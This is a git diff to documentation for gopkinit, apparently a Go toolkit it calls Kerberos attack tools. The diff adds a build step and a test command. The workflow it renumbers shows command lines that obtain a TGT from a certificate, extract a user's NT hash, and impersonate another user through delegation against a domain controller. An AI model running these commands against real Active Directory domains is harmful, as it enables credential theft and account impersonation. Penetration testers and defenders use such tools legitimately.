@@ -15,13 +15,16 @@ Comprehensive documentation for the gopkinit Kerberos attack tools.
 ### Workflow
 
 ```bash
-# Step 1: Get TGT with certificate (PKINIT)
+# Step 1: Build (using Makefile)
+make
+
+# Step 2: Get TGT with certificate (PKINIT)
 ./gettgtpkinit -cert-pfx user.pfx -dc-ip 10.0.0.1 DOMAIN.COM/user output.ccache
 
-# Step 2a: Extract NT hash from PKINIT TGT
+# Step 3a: Extract NT hash from PKINIT TGT
 ./getnthash -ccache output.ccache -key <asrep-key> -dc-ip 10.0.0.1
 
-# Step 2b: OR impersonate another user (requires delegation)
+# Step 3b: OR impersonate another user (requires delegation)
 ./gets4uticket -ccache admin.ccache -impersonate user@DOMAIN.COM \
   -spn cifs/server@DOMAIN.COM -dc-ip 10.0.0.1 -out user.ccache
 ```
@@ -44,3 +47,10 @@ Comprehensive documentation for the gopkinit Kerberos attack tools.
 - [Main README](../README.md) for library usage and API documentation
 - [PKINITtools](https://github.com/dirkjanm/PKINITtools) - Python reference implementation
 - [minikerberos](https://github.com/skelsec/minikerberos) - Python Kerberos library
+
+## Testing
+
+```bash
+# Run all unit tests
+go test ./... -v
+```
